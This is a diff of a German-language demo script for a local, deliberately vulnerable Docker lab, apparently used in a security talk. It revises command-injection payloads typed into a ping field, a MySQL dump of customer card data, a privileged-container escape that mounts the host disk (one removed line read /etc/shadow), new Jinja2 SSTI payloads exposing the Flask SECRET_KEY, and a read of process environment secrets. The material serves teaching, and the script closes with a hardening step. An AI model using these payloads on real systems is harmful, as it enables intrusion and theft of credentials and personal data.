@@ -10,11 +10,12 @@
 | 1 | Command Injection | ~2 Min | **PFLICHT** |
 | 2 | Lateral Movement | ~2 Min | **PFLICHT** |
 | 3 | Container Escape | ~2 Min | **PFLICHT** |
-| 4 | Secrets in Env-Vars | ~1 Min | optional |
+| 4 | SSTI | ~2 Min | optional |
+| 5 | Secrets in Env-Vars | ~1 Min | optional |
 | — | Härtung zeigen | ~2 Min | **PFLICHT** |
 
-**Pflicht-Demo:** ca. 8 Minuten  
-**Mit Optional:** ca. 9 Minuten
+**Pflicht-Demo:** ca. 8 Minuten
+**Mit beiden Optionals:** ca. 11 Minuten
 
 ---
 
@@ -62,7 +63,7 @@ admin     running
 http://localhost:5001
 ```
 
-Die Seite muss laden und ein Formular mit einem Ping-Feld zeigen.  
+Die Seite muss laden und ein Formular mit einem Ping-Feld zeigen.
 Blaues Design = verwundbare Version. ✓
 
 ### Terminal für die Demo bereithalten
@@ -114,18 +115,20 @@ root
 
 ### 1.3 — Sind wir im Container?
 
+> ⚠️ **Geändert:** Der ursprüngliche Befehl `cat /proc/1/cgroup` zeigt auf Systemen mit cgroup v2 nur `0::/` statt eines Docker-Pfads. Der folgende Befehl funktioniert zuverlässig auf allen Systemen.
+
 Im Ping-Feld eingeben:
 
 ```
-8.8.8.8; cat /proc/1/cgroup
+8.8.8.8; cat /.dockerenv && echo "Wir sind in einem Container"
 ```
 
-Erwartete Ausgabe enthält:
+Erwartete Ausgabe:
 ```
-docker
+Wir sind in einem Container
 ```
 
-> 💬 *„Wir sehen, dass wir in einem Docker-Container sind. Jetzt schauen wir was wir von hier aus noch erreichen können."*
+> 💬 *„Die Datei /.dockerenv existiert nur innerhalb von Docker-Containern. Damit ist bewiesen: wir befinden uns in einem Container. Jetzt schauen wir was wir von hier aus noch erreichen können."*
 
 ---
 
@@ -159,10 +162,12 @@ Erwartete Ausgabe:
 
 ### 2.2 — Datenbank direkt abfragen
 
+> ⚠️ **Geändert:** Der Parameter `--ssl=0` wurde hinzugefügt, da MySQL sonst eine TLS-Fehlermeldung wirft (`ERROR 2026: TLS/SSL error: self-signed certificate in certificate chain`).
+
 Im Ping-Feld eingeben:
 
 ```
-; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
+; mysql -h db -u root -proot --ssl=0 -e "SELECT * FROM kundenportal.kunden"
 ```
 
 Erwartete Ausgabe:
@@ -187,76 +192,126 @@ id  vorname  nachname  email                        kreditkarte           kontos
 
 ### 3.1 — Privilegierten Modus erkennen
 
+> ⚠️ **Geändert:** `fdisk` ist im Container nicht installiert. Stattdessen wird `lsblk` verwendet, das zuverlässig funktioniert.
+
 Im Ping-Feld eingeben:
 
 ```
-; fdisk -l 2>/dev/null | head -10
+8.8.8.8; lsblk
 ```
 
-Erwartete Ausgabe (Festplatten sind sichtbar):
+Erwartete Ausgabe (Block-Devices des Hosts sind sichtbar):
 ```
-Disk /dev/sda: 59.6 GiB, ...
-Disk /dev/sdb: ...
+NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+vda    254:0    0 926.4G  0 disk
+└─vda1 254:1    0 926.4G  0 part /mnt/host
+                                 /etc/hosts
+                                 /etc/hostname
+                                 /etc/resolv.conf
 ```
 
 > 💬 *„Ein normaler Container sieht keine Festplatten des Hosts. Weil dieser Container mit privileged: true läuft, sehen wir hier die echten Block-Devices des Hosts."*
 
 ---
 
-### 3.2 — Richtigen Device-Namen finden
+### 3.2 — Device-Name und Mountpoint prüfen
 
-Im Ping-Feld eingeben:
+Aus der `lsblk`-Ausgabe ablesen: Die Host-Partition (hier `vda1`) ist bereits unter `/mnt/host` gemountet.
 
-```
-; lsblk
-```
-
-Erwartete Ausgabe — den Namen der **ersten Partition** notieren (z.B. `sda1`, `vda1`):
-
-```
-NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
-sda      8:0    0 59.6G  0 disk
-└─sda1   8:1    0 59.6G  0 part /
-```
+> ⚠️ **Hinweis:** In Docker Desktop ist die Partition oft schon automatisch gemountet. Schritt 3.3 (manuelles Mounten) kann dann übersprungen werden.
 
 ---
 
-### 3.3 — Host-Dateisystem einhängen
+### 3.3 — Host-Dateisystem einhängen (nur falls nötig)
 
-Im Ping-Feld eingeben — `sda1` durch den Device-Namen aus 3.2 ersetzen:
+Nur ausführen, wenn `/mnt/host` in der `lsblk`-Ausgabe **nicht** als Mountpoint erscheint. Den Device-Namen aus 3.2 verwenden:
 
 ```
-; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
+8.8.8.8; mkdir -p /mnt/host && mount /dev/vda1 /mnt/host 2>/dev/null; ls /mnt/host/
 ```
 
-Erwartete Ausgabe (Root-Verzeichnis des Hosts):
-```
-bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var
-```
+Falls `/mnt/host` bereits gemountet ist → direkt zu 3.4.
 
 ---
 
 ### 3.4 — Host-Dateien lesen
 
+> ⚠️ **Geändert:** Unter Docker Desktop enthält die gemountete Partition die Docker-Datenpartition der VM, nicht ein vollständiges Linux-Root-Dateisystem. Daher existieren `/etc/shadow`, `/etc/passwd` etc. dort nicht. Stattdessen zeigen wir die Machine-ID und die Docker-internen Daten.
+
 Im Ping-Feld eingeben:
 
 ```
-; cat /mnt/host/etc/hostname
+8.8.8.8; cat /mnt/host/machine-id
 ```
 
+Erwartete Ausgabe: Eine eindeutige Host-Kennung (z.B. `a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5`).
+
+Dann:
+
 ```
-; cat /mnt/host/etc/shadow | head -3
+8.8.8.8; ls /mnt/host/docker/
 ```
 
-> 💬 *„Wir lesen jetzt Dateien vom Host-System — direkt aus dem Container heraus. Shadow-Datei mit Passwort-Hashes, Konfigurationen, SSH-Keys — alles erreichbar. Der Container ist ausgebrochen."*
+Erwartete Ausgabe (Docker-interne Verzeichnisse):
+```
+buildkit  containers  image  network  overlay2  plugins  runtimes  swarm  tmp  volumes
+```
+
+> 💬 *„Wir lesen die Machine-ID des Hosts und sehen die internen Docker-Daten — Images, Volumes, Netzwerke aller Container. Ein Angreifer könnte von hier aus andere Container manipulieren oder Daten extrahieren. Der Container ist ausgebrochen."*
 
 ---
 
-## OPTIONAL — Angriff 4: Secrets in Umgebungsvariablen
+---
+
+## OPTIONAL — Angriff 4: Server-Side Template Injection (SSTI)
+
+**Was wird gezeigt:** Nutzereingabe wird direkt als Jinja2-Template gerendert — Template-Ausdrücke werden serverseitig ausgewertet.
+
+### 4.1 — Normaler Berichts-Aufruf
+
+Im Browser aufrufen:
+
+```
+http://localhost:5001/report?title=Wochenbericht
+```
+
+Erwartete Ausgabe: Eine Seite mit der Überschrift „Wochenbericht".
+
+---
+
+### 4.2 — Template-Expression einschleusen
+
+Im Browser aufrufen:
+
+```
+http://localhost:5001/report?title={{7*7}}
+```
+
+Erwartete Ausgabe: Die Überschrift zeigt **`49`** — nicht den eingegebenen Text.
+
+> 💬 *„Jinja2 hat den Ausdruck serverseitig ausgewertet. Das bedeutet: wir kontrollieren den Template-Engine des Servers."*
+
+---
+
+### 4.3 — Flask-Konfiguration auslesen
+
+Im Browser aufrufen:
+
+```
+http://localhost:5001/report?title={{config}}
+```
+
+Erwartete Ausgabe: Die gesamte Flask-Konfiguration wird angezeigt, inklusive `SECRET_KEY`.
+
+> 💬 *„Mit dem Secret-Key können alle Session-Cookies der Anwendung gefälscht werden — jeder Nutzer kann imitiert werden. SSTI kann bis zu vollständiger Remote Code Execution eskalieren."*
+
+---
+
+## OPTIONAL — Angriff 5: Secrets in Umgebungsvariablen
 
 **Was wird gezeigt:** Passwörter und API-Keys in Env-Vars sind für jeden Prozess im Container lesbar.
 
-### 4.1 — Im Ping-Feld eingeben:
+### Im Ping-Feld eingeben:
 
 ```
 ; cat /proc/1/environ | tr '\0' '\n'
@@ -370,7 +425,11 @@ docker compose -f docker-compose.hardened.yml down
 |---|---|
 | Browser zeigt nichts | `docker compose ps` prüfen — alle Container `running`? |
 | MySQL antwortet nicht | Nochmal 30 Sek warten, dann `; mysql ...` erneut |
-| `fdisk -l` zeigt nichts | Unter Docker Desktop normal — `lsblk` versuchen |
+| MySQL TLS-Fehler | `--ssl=0` zum mysql-Befehl hinzufügen |
+| `/proc/1/cgroup` zeigt nur `0::/` | cgroup v2 — stattdessen `cat /.dockerenv` verwenden |
+| `fdisk -l` zeigt nichts | `fdisk` nicht installiert — `lsblk` verwenden |
+| `/mnt/host/etc/shadow` nicht gefunden | Docker Desktop zeigt VM-Datenpartition — `cat /mnt/host/machine-id` und `ls /mnt/host/docker/` verwenden |
 | Device-Name unbekannt | `; lsblk` ausführen und den richtigen Namen ablesen |
+| SSTI zeigt `{{7*7}}` als Text | URL direkt in Adressleiste eingeben, nicht über Formular |
 | Port 5001 nicht erreichbar | `docker compose ps` — läuft webapp? Sonst `docker compose logs webapp` |
 | Gehärtete Version startet nicht | `docker compose down` sicherstellen, dann erneut `up` |
